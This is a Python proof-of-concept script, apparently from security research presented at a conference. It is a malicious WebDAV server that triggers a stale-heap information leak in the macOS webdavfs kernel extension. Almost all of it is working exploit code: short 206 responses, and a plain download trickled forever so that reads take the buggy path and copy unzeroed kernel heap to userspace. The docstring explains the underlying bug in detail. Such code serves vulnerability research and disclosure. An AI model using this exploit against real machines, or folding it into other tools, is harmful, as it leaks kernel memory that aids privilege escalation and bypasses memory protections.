#!/usr/bin/env python3
"""
webdav_server.py -- malicious WebDAV server for the webdavfs stale-heap
info-leak PoC (stage 0; Black Hat USA 2026, Blazakis/Calif).

The webdavfs kext (webdav_read_bytes) allocates an unzeroed ~19.7 MB
kalloc_large buffer, asks the userland mount daemon for request_read.count
bytes over a socket with MSG_WAITALL, never checks how many bytes actually
came back, and then uiomove()s request_read.count bytes into the user's
uio. soreceive() may legally return short with error == 0 when the peer
closes. This server makes that happen:

  * GET with a Range header gets a well-formed '206 Partial Content'
    response with a correct Content-Range header, but a body SHORTER than
    the requested range (--body-len controls exactly how many bytes).
  * After sending the short body the connection is closed, so the mount
    daemon's network_read() sees EOF, forwards the short reply to the
    kernel, and closes the per-request socket. translate_status_to_error
    maps all 2xx to success, so no error is ever reported.
  * A plain GET (no Range) is the daemon's background whole-file download;
    it is answered with full Content-Length but the body is trickled at
    1 byte/sec forever, so the download never finishes.  This keeps
    UF_NODUMP set on the cache file, which is the condition that makes
    pread() past the downloaded end go through webdav_read_bytes() (the
    buggy path) instead of being served from the cache file.

The shortfall (count - received) is stale, unzeroed kernel heap copied to
userspace.

Stdlib only. Tested with curl; see README.md.
"""

import argparse
import logging
import sys
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

FILE_PATH = "/poc.bin"
FILE_SIZE = 32 * 1024 * 1024          # 32 MiB: > kext MAX_READ (0x12d0000)
                                      # so one pread can cover the whole
                                      # stale kalloc_large buffer
BODY_BYTE = b"A"                      # recognizable filler for delivered bytes

LOG = logging.getLogger("webdav-pwn")


def _propfind_response(href, is_dir):
    """One <D:response> element advertising the props webdavfs asks for."""
    if is_dir and not href.endswith("/"):
        href += "/"
    name = href.rstrip("/").rsplit("/", 1)[-1] or "/"
    if is_dir:
        resourcetype = "<D:resourcetype><D:collection/></D:resourcetype>"
        length = ""
        isc = "1"
    else:
        resourcetype = "<D:resourcetype/>"
        length = "<D:getcontentlength>%d</D:getcontentlength>" % FILE_SIZE
        isc = "0"
    return (
        "<D:response>"
        "<D:href>%s</D:href>"
        "<D:propstat><D:prop>"
        "<D:displayname>%s</D:displayname>"
        "<D:creationdate>2026-01-01T00:00:00Z</D:creationdate>"
        "<D:getlastmodified>Wed, 01 Jan 2026 00:00:00 GMT</D:getlastmodified>"
        "%s"
        "<D:getetag>\"deadbeef\"</D:getetag>"
        "%s"
        "<D:iscollection>%s</D:iscollection>"
        "<D:ishidden>0</D:ishidden>"
        "</D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat>"
        "</D:response>" % (href, name, length, resourcetype, isc)
    )


class WebdavPwnHandler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    server_version = "WebdavPwn/0.1"

    # -- plumbing -----------------------------------------------------------

    def log_message(self, fmt, *args):
        LOG.info("%s %s", self.address_string(), fmt % args)

    def _reply(self, code, length, extra=None):
        """Send a response head with an accurate Content-Length and mark the
        connection for close (EOF is what makes the daemon forward a short
        reply to the kext)."""
        self.send_response(code)
        self.send_header("Content-Length", str(length))
        self.send_header("Connection", "close")
        for k, v in (extra or {}).items():
            self.send_header(k, v)
        self.end_headers()
        self.close_connection = True

    def _drain_body(self):
        try:
            cl = int(self.headers.get("Content-Length") or 0)
        except ValueError:
            cl = 0
        while cl > 0:
            chunk = self.rfile.read(min(cl, 65536))
            if not chunk:
                break
            cl -= len(chunk)

    # -- WebDAV methods -----------------------------------------------------

    def do_OPTIONS(self):
        LOG.info("OPTIONS %s", self.path)
        self._drain_body()
        self._reply(200, 0, {
            "DAV": "1,2",
            "Allow": "OPTIONS, PROPFIND, GET, HEAD",
            "MS-Author-Via": "DAV",
            "Accept-Ranges": "bytes",
        })

    def do_PROPFIND(self):
        depth = self.headers.get("Depth", "infinity")
        self._drain_body()
        path = self.path.split("?", 1)[0]
        norm = path.rstrip("/") or "/"
        LOG.info("PROPFIND %s Depth=%s", path, depth)

        responses = []
        is_file = norm == FILE_PATH
        responses.append(_propfind_response(norm, is_dir=not is_file))
        if depth == "1" and not is_file:
            responses.append(_propfind_response(FILE_PATH, is_dir=False))

        body = (
            '<?xml version="1.0" encoding="utf-8"?>\n'
            '<D:multistatus xmlns:D="DAV:">'
            + "".join(responses)
            + "</D:multistatus>"
        ).encode("utf-8")
        self._reply(207, len(body),
                    {"Content-Type": 'application/xml; charset="utf-8"'})
        self.wfile.write(body)

    def do_HEAD(self):
        LOG.info("HEAD %s", self.path)
        self._drain_body()
        self._reply(200, 0, {"Accept-Ranges": "bytes",
                             "Content-Type": "application/octet-stream"})

    def do_GET(self):
        self._drain_body()
        rng = self.headers.get("Range")
        body_len = self.server.body_len

        if rng and rng.strip().lower().startswith("bytes="):
            spec = rng.split("=", 1)[1].split(",", 1)[0]
            start_s, _, end_s = spec.partition("-")
            try:
                start = int(start_s)
            except ValueError:
                start = 0
            try:
                end = int(end_s) if end_s else FILE_SIZE - 1
            except ValueError:
                end = FILE_SIZE - 1
            if end < start:
                self._reply(416, 0,
                            {"Content-Range": "bytes */%d" % FILE_SIZE})
                return
            requested = end - start + 1
            send = min(body_len, requested)
            LOG.info("GET %s Range=%s -> 206 requested=%d SENDING=%d "
                     "(shortfall=%d)", self.path, rng, requested, send,
                     requested - send)
            self._reply(206, send, {
                "Content-Range": "bytes %d-%d/%d" % (start, end, FILE_SIZE),
                "Accept-Ranges": "bytes",
                "Content-Type": "application/octet-stream",
            })
            if send:
                self.wfile.write(BODY_BYTE * send)
        else:
            # Plain GET = the mount daemon's streamed GET in network_open()
            # / background download.  stream_get_transaction() synchronously
            # reads first_read_len body bytes BEFORE replying to the kernel's
            # OPEN upcall, so send those immediately or open() hangs.
            # first_read_len is the system page size (get_first_read_len):
            # 16384 on arm64, 4096 on x86_64 -- send 16384 to cover both.
            # After that, trickle 1 byte/sec forever so the download never
            # finishes: the kext keeps UF_NODUMP set on the cache file and
            # pread() past the downloaded end takes the buggy
            # webdav_read_bytes() path (its Range GET arrives on a second
            # connection and is handled above).
            LOG.info("GET %s (no Range) -> 200 first-read + trickle, "
                     "download held open", self.path)
            self.send_response(200)
            self.send_header("Content-Length", str(FILE_SIZE))
            self.send_header("Accept-Ranges", "bytes")
            self.send_header("Content-Type", "application/octet-stream")
            self.end_headers()
            try:
                self.wfile.write(BODY_BYTE * 16384)
                self.wfile.flush()
                sent = 16384
                while True:
                    self.wfile.write(BODY_BYTE)
                    self.wfile.flush()
                    sent += 1
                    time.sleep(1)
            except (BrokenPipeError, ConnectionResetError, OSError):
                pass
            LOG.info("GET %s trickle ended after %d bytes", self.path, sent)

    # Everything else: refuse politely but keep the connection semantics.
    def do_PUT(self):    self._refuse("PUT")
    def do_DELETE(self): self._refuse("DELETE")
    def do_LOCK(self):   self._refuse("LOCK")
    def do_UNLOCK(self): self._refuse("UNLOCK")
    def do_PROPPATCH(self): self._refuse("PROPPATCH")
    def do_MKCOL(self):  self._refuse("MKCOL")
    def do_COPY(self):   self._refuse("COPY")
    def do_MOVE(self):   self._refuse("MOVE")

    def _refuse(self, method):
        LOG.info("%s %s -> 405", method, self.path)
        self._drain_body()
        self._reply(405, 0, {"Allow": "OPTIONS, PROPFIND, GET, HEAD"})


def parse_size(s):
    s = s.strip().lower()
    mult = 1
    for suffix, m in (("kib", 1024), ("mib", 1024**2), ("k", 1024),
                      ("m", 1024**2), ("g", 1024**3)):
        if s.endswith(suffix):
            mult = m
            s = s[: -len(suffix)]
            break
    return int(s) * mult


def main(argv=None):
    ap = argparse.ArgumentParser(
        description="Malicious WebDAV server: well-formed but SHORT 206 "
                    "responses to trigger the webdavfs stale-heap info-leak.")
    ap.add_argument("--bind", default="127.0.0.1",
                    help="bind address (default: 127.0.0.1)")
    ap.add_argument("--port", type=int, default=8080,
                    help="listen port (default: 8080)")
    ap.add_argument("--body-len", type=parse_size, default=0, metavar="N",
                    help="bytes of body to actually send per GET, regardless "
                         "of the requested range (default: 0 = Content-Length: "
                         "0; use M < requested to return a short 206)")
    args = ap.parse_args(argv)

    logging.basicConfig(level=logging.INFO,
                        format="%(asctime)s %(name)s: %(message)s")

    srv = ThreadingHTTPServer((args.bind, args.port), WebdavPwnHandler)
    srv.daemon_threads = True
    srv.body_len = args.body_len
    LOG.info("serving %s (%d bytes advertised) on http://%s:%d  body-len=%d",
             FILE_PATH, FILE_SIZE, args.bind, args.port, args.body_len)
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        srv.server_close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
